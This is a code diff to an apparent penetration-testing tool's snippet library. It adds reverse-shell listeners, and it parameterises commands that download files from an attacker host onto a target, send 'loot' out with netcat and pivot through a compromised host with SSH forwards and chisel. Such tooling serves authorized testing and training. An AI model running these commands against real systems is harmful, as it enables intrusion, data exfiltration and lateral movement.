@@ -17,6 +17,21 @@ const ttyUpgrade: WorkstationItem = {
     { id: "bg", label: "2. Background shell", command: "export TERM=xterm", explain: "Then press Ctrl+Z to background it." },
     { id: "stty", label: "3. Raw mode (run locally)", command: "stty raw -echo; fg", explain: "Run in YOUR terminal after Ctrl+Z, then press Enter twice." },
     { id: "resize", label: "4. Fix size", command: "stty rows 38 columns 116", explain: "Match your terminal dimensions." },
+    {
+      id: "rlwrap",
+      group: "Listeners with a real PTY",
+      label: "rlwrap listener",
+      command: "rlwrap nc -lvnp {LPORT}",
+      explain: "Catch your next shell with rlwrap — instant arrow keys and history, no upgrade dance needed.",
+      newTab: true,
+    },
+    {
+      id: "socat-listen",
+      label: "socat full-PTY listener",
+      command: "socat FILE:`tty`,RAW,ECHO=0 TCP-LISTEN:{LPORT}",
+      explain: "Pair with the socat reverse shell payload for a fully interactive session straight away.",
+      newTab: true,
+    },
   ],
 };
 
@@ -27,17 +42,16 @@ const fileTransfer: WorkstationItem = {
   summary: "Move tools and loot between your box and the target.",
   kind: "snippets",
   snippets: [
-    { id: "http-server", label: "Serve cwd (python3)", command: "python3 -m http.server 80", explain: "Host files from your box on port 80.", newTab: true },
-    { id: "http-server-8000", label: "Serve cwd (port 8000)", command: "python3 -m http.server 8000", newTab: true },
-    { id: "wget", label: "Download (wget)", command: "wget http://{LHOST}/file -O /tmp/file" },
-    { id: "curl", label: "Download (curl)", command: "curl http://{LHOST}/file -o /tmp/file" },
-    { id: "certutil", label: "Download (Windows certutil)", command: "certutil -urlcache -f http://{LHOST}/file.exe file.exe" },
-    { id: "ps-download", label: "Download (PowerShell)", command: "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}/file.exe -OutFile file.exe\"" },
-    { id: "nc-send", label: "Send with nc (receiver)", command: "nc -lvnp 4444 > incoming.file", newTab: true },
-    { id: "nc-recv", label: "Send with nc (sender)", command: "nc {LHOST} 4444 < outgoing.file" },
-    { id: "scp", label: "SCP", command: "scp file {USER}@{RHOST}:/tmp/file" },
-    { id: "b64-enc", label: "Base64 encode (source)", command: "base64 -w0 file", explain: "Copy the output, then decode on the target." },
-    { id: "b64-dec", label: "Base64 decode (target)", command: "echo <base64> | base64 -d > file" },
+    { id: "http-server", label: "Serve cwd (python3)", command: "python3 -m http.server {FILEPORT}", explain: "Host files from your box. Files are then at http://{LHOST}:{FILEPORT}/{FILE}.", newTab: true },
+    { id: "wget", label: "Download (wget)", command: "wget http://{LHOST}:{FILEPORT}/{FILE} -O /tmp/{FILE}" },
+    { id: "curl", label: "Download (curl)", command: "curl http://{LHOST}:{FILEPORT}/{FILE} -o /tmp/{FILE}" },
+    { id: "certutil", label: "Download (Windows certutil)", command: "certutil -urlcache -f http://{LHOST}:{FILEPORT}/{FILE} {FILE}" },
+    { id: "ps-download", label: "Download (PowerShell)", command: "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}:{FILEPORT}/{FILE} -OutFile {FILE}\"" },
+    { id: "nc-send", label: "Send with nc (receiver)", command: "nc -lvnp {FILEPORT} > {FILE}", newTab: true },
+    { id: "nc-recv", label: "Send with nc (sender)", command: "nc {LHOST} {FILEPORT} < {FILE}" },
+    { id: "scp", label: "SCP", command: "scp {FILE} {USER}@{RHOST}:/tmp/{FILE}" },
+    { id: "b64-enc", label: "Base64 encode (source)", command: "base64 -w0 {FILE}", explain: "Copy the output, then decode on the target." },
+    { id: "b64-dec", label: "Base64 decode (target)", command: "echo <base64> | base64 -d > {FILE}", runnable: false },
   ],
 };
 
@@ -66,12 +80,11 @@ const pivoting: WorkstationItem = {
   summary: "Reach internal networks through a compromised host.",
   kind: "snippets",
   snippets: [
-    { id: "ssh-local", label: "SSH local forward", command: "ssh -L 8080:127.0.0.1:80 {USER}@{RHOST}", explain: "Expose a target-internal port on your box." },
-    { id: "ssh-dynamic", label: "SSH dynamic (SOCKS)", command: "ssh -D 1080 {USER}@{RHOST}", explain: "Then set proxychains to socks5 127.0.0.1 1080." },
-    { id: "ssh-remote", label: "SSH remote forward", command: "ssh -R 8080:127.0.0.1:80 {USER}@{LHOST}" },
-    { id: "chisel-server", label: "chisel server (your box)", command: "chisel server -p 8000 --reverse", newTab: true },
-    { id: "chisel-client", label: "chisel client (target)", command: "chisel client {LHOST}:8000 R:socks" },
-    { id: "proxychains", label: "Run via proxychains", command: "proxychains -q nmap -sT -Pn {RHOST}" },
+    { id: "ssh-local", label: "SSH local forward", command: "ssh -L {LPORT}:127.0.0.1:{RPORT} {USER}@{RHOST}", explain: "Expose a target-internal port on your box." },
+    { id: "ssh-dynamic", label: "SSH dynamic (SOCKS)", command: "ssh -D {LPORT} {USER}@{RHOST}", explain: "Then set proxychains to socks5 127.0.0.1 {LPORT}." },
+    { id: "ssh-remote", label: "SSH remote forward", command: "ssh -R {LPORT}:127.0.0.1:{RPORT} {USER}@{LHOST}" },
+    { id: "chisel-server", label: "chisel server (your box)", command: "chisel server -p {LPORT} --reverse", newTab: true },
+    { id: "chisel-client", label: "chisel client (target)", command: "chisel client {LHOST}:{LPORT} R:socks" },
   ],
 };
 
